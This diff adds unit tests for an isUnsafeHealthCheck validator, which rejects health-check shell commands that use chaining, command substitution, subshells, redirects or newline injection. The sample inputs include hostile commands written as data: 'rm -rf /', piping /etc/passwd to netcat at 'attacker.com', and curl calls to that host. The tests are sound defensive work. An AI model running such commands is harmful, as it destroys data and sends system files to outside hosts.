@@ -1,5 +1,39 @@
 import { describe, test, expect, beforeAll } from 'bun:test';
-import { parseRecipe } from '../src/commands/integrations.ts';
+import { parseRecipe, isUnsafeHealthCheck } from '../src/commands/integrations.ts';
+
+// --- isUnsafeHealthCheck tests (R3-F001 fix) ---
+
+describe('isUnsafeHealthCheck', () => {
+  test('allows simple commands', () => {
+    expect(isUnsafeHealthCheck('echo ok')).toBe(false);
+    expect(isUnsafeHealthCheck('curl -s https://api.example.com/health')).toBe(false);
+    expect(isUnsafeHealthCheck('which git')).toBe(false);
+    expect(isUnsafeHealthCheck('python3 --version')).toBe(false);
+  });
+
+  test('blocks shell chaining operators', () => {
+    expect(isUnsafeHealthCheck('echo ok; rm -rf /')).toBe(true);
+    expect(isUnsafeHealthCheck('echo ok && curl attacker.com')).toBe(true); // & is in the blocklist
+    expect(isUnsafeHealthCheck('echo ok & bg-process')).toBe(true);
+    expect(isUnsafeHealthCheck('cat /etc/passwd | nc attacker.com 4444')).toBe(true);
+  });
+
+  test('blocks command substitution', () => {
+    expect(isUnsafeHealthCheck('echo $(whoami)')).toBe(true);
+    expect(isUnsafeHealthCheck('echo `id`')).toBe(true);
+  });
+
+  test('blocks subshell and brace expansion', () => {
+    expect(isUnsafeHealthCheck('(curl attacker.com)')).toBe(true);
+    expect(isUnsafeHealthCheck('{echo,/etc/passwd}')).toBe(true);
+  });
+
+  test('blocks redirect and newline injection', () => {
+    expect(isUnsafeHealthCheck('echo ok > /dev/null')).toBe(true);
+    expect(isUnsafeHealthCheck('echo ok < /etc/passwd')).toBe(true);
+    expect(isUnsafeHealthCheck('echo ok\ncurl attacker.com')).toBe(true);
+  });
+});
 
 // --- parseRecipe tests ---
 
